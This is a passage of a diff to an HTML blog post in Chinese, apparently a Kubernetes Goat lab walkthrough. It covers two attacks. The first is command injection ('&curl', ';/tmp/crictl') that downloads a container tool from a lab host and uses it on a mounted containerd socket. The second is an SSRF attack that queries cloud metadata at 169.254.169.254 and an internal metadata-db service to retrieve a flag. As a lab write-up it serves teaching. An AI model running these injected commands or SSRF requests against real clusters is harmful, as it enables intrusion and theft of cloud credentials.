xMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2013.43.17.png" style="zoom:40%;">
+
+<p>成功下载到crictl-1.tar.gz。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token function">curl</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-o</span> /tmp/crictl-2.tar.gz http://192.168.52.13:8000/crictl-v1.33.0-linux-amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2013.48.41.png" style="zoom:50%;">
+
+<p>用curl也可以下载。</p>
+</blockquote>
+<ul>
+<li>3）解压crictl程序</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> /tmp/crictl-1.tar.gz <span class="token parameter variable">-C</span> /tmp/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2014.00.37.png" style="zoom:40%;">
+
+<ul>
+<li>4）操作宿主机docker守护进程</li>
 </ul>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span>/tmp/crictl <span class="token parameter variable">-r</span> unix:///custom/containerd/containerd.sock images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2014.01.50.png" style="zoom:50%;">
+
+<ul>
+<li>显示为空可能原因是当前k8s正在占用docker socket。</li>
+</ul>
+<p>正常情况下会看到宿主机的镜像文件，表明通过容器的挂载的socket操控了宿主机的docker守护进程。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2014.09.05.png" style="zoom:40%;">
 
 
-<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-08%2016.52.05.png" style="zoom:50%;">
+
+<h2 id="3-3-SSRF-in-the-Kubernetes-K8S-world"><a href="#3-3-SSRF-in-the-Kubernetes-K8S-world" class="headerlink" title="3.3 SSRF in the Kubernetes (K8S) world"></a>3.3 SSRF in the Kubernetes (K8S) world</h2><p>如何利用SSRF漏洞获取Kubernetes访问权限。</p>
+<h3 id="3-3-1-场景介绍"><a href="#3-3-1-场景介绍" class="headerlink" title="3.3.1 场景介绍"></a>3.3.1 场景介绍</h3><p>该场景旨在展示当前云环境中普遍存在的热门SSRF应用安全漏洞被利用的情况，探讨该漏洞如何影响Kubernetes集群、内部服务及微服务架构。此类漏洞对云原生环境具有重大影响，其中Shopify案例就是典型实例——Exchange系统中的SSRF漏洞最终导致攻击者获取了所有实例的ROOT权限。</p>
+<p>SSRF （Server Side Request Forgery，服务器端请求伪造）漏洞成为云原生环境的首选攻击。在这个场景中，我们将看到如何利用SSRF等应用程序漏洞来访问云实例元数据以及内部服务元数据信息。特别是我们会看到Kubernetes原生功能的强大功能，如服务发现，可以利用和获得其他内部微服务的访问。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-12%2016.51.12.png" style="zoom:50%;">
+
+<p>实践目的：</p>
+<ol>
+<li>如何在云环境下利用应用程序中的SSRF漏洞。</li>
+<li>理解元数据查询特性以获得对云提供商数据的访问。</li>
+<li>理解和利用Kubernetes原生服务发现功能和服务DNS查询。</li>
+<li>获得对集群环境内部微服务的访问权限。</li>
+</ol>
+<h3 id="3-3-2-场景访问"><a href="#3-3-2-场景访问" class="headerlink" title="3.3.2 场景访问"></a>3.3.2 场景访问</h3><p><code>http://192.168.52.13:1232</code></p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2010.18.19.png" style="zoom:50%;">
 
 
 
-<p>⚠️：目前基于minikube搭建的靶场无法复现，宿主机sock被k8s占用，无法完全复现。</p>
+<p>目标：要完成此场景，需要在元数据secrets中获取k8s-goat-FLAG标志值。</p>
+<h3 id="3-3-3-实践"><a href="#3-3-3-实践" class="headerlink" title="3.3.3 实践"></a>3.3.3 实践</h3><blockquote>
+<h4 id="169-254-169-254地址："><a href="#169-254-169-254地址：" class="headerlink" title="169.254.169.254地址："></a>169.254.169.254地址：</h4><p>169.254.169.254是动态配置的链路本地IPv4地址。它只在一个网段上有效，并且不能被路由。大多数云提供商使用此地址为实例提供计算元数据，包括AWS、GCP Azure、Digital Ocean等主要提供商。</p>
+<ul>
+<li><strong>链路本地地址（Link-Local Address）</strong></li>
+</ul>
+<p><strong>定义</strong>：链路本地地址是用于<strong>同一物理或虚拟网络段内通信</strong>的IP地址，无需手动配置或依赖DHCP服务器。这类地址属于<strong>169.254.0.0/16</strong>范围，由设备在无法获取IP时自动分配。</p>
+<ul>
+<li>特点：</li>
+</ul>
+<p><strong>不可路由</strong>：无法通过路由器访问其他网络，仅限本地网络使用。</p>
+<p><strong>动态分配</strong>：无需人工干预，适合临时或封闭环境。</p>
+<ul>
+<li><strong>云服务中的特殊用途</strong></li>
+</ul>
+<p><strong>元数据服务（Metadata Service）</strong>：</p>
+<p>1）功能：云服务器实例（如虚拟机）通过访问此地址，获取自身动态信息，例如：</p>
+<ul>
+<li><p>实例ID、主机名、区域等基础信息。</p>
+</li>
+<li><p>临时安全凭证（如AWS的STS Token）。</p>
+</li>
+<li><p>用户启动时注入的自定义脚本（User Data）。</p>
+</li>
+<li><p>网络配置（公网IP、私有IP等）。</p>
+</li>
+<li><p><strong>访问方式</strong>：通过HTTP协议访问，例如：</p>
+</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://169.254.169.254/latest/meta-data/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2）<strong>安全性</strong>：</p>
+<ul>
+<li><strong>仅限实例内部访问</strong>：外部网络或用户无法直接请求该地址，避免了敏感数据泄露。</li>
+<li><strong>短暂性凭证</strong>：提供临时令牌而非长期密钥，降低安全风险。</li>
+</ul>
+</blockquote>
+<p>我们可以使用169.254.169.254访问默认的实例元数据服务。我们还需要确定服务使用哪个云提供商来运行此计算，以便我们可以使用特定的头信息和查询。如果这不是托管在云提供商中，那么我们可以跳过它，并转移到内部服务查询，如其他微服务和Kubernetes集群中的内部服务。</p>
+<ul>
+<li>信息收集</li>
+</ul>
+<p>我们可以从枚举和侦察开始，根据现有信息了解当前实例及其他网络中运行的服务。</p>
+<p>我们还可以通过查询不同端口和地址来检查当前容器/ Pod 中是否运行着其他服务。让我们用 GET 方法查询同一容器中的 5000 端口 <code>http://127.0.0.1:5000</code>。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2010.36.56.png" style="zoom:50%;">
+
+<p>可以通过SSRF漏洞看到当前容器正在运行某个Web服务并返回了HTTP响应。因此，我们现在掌握了更多数据/信息，可以进一步推进攻击，以获取Kubernetes网络服务内部的更深层访问权限。</p>
+<ul>
+<li>访问内部服务【以下内容在minikube-goat靶场无法复现，在metarget-goat靶场可以复现】</li>
+</ul>
+<p>现在我们可以看到集群内部有一个仅限内部访问的服务叫做metadata-db，我们发起查询看看是否能获取更多有用信息<code>http://metadata-db</code>。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2011.18.22.png" style="zoom:30%;">
+
+<p>在遍历完所有键值后，最终我们可以在<code>http://metadata-db/latest/secrets/kubernetes-goat</code>端点处发现一个标志。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2011.21.38.png" style="zoom:40%;">
+
+<p>我们可以对返回/获取的base64编码标志进行解码以查看信息</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI="</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2011.23.03.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.07.38.png" style="zoom:50%;">
+
+<p><code>flag：k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab</code></p>
+<p>最终成功通过ssrf访问到k8s集群内部的数据服务的数据。</p>
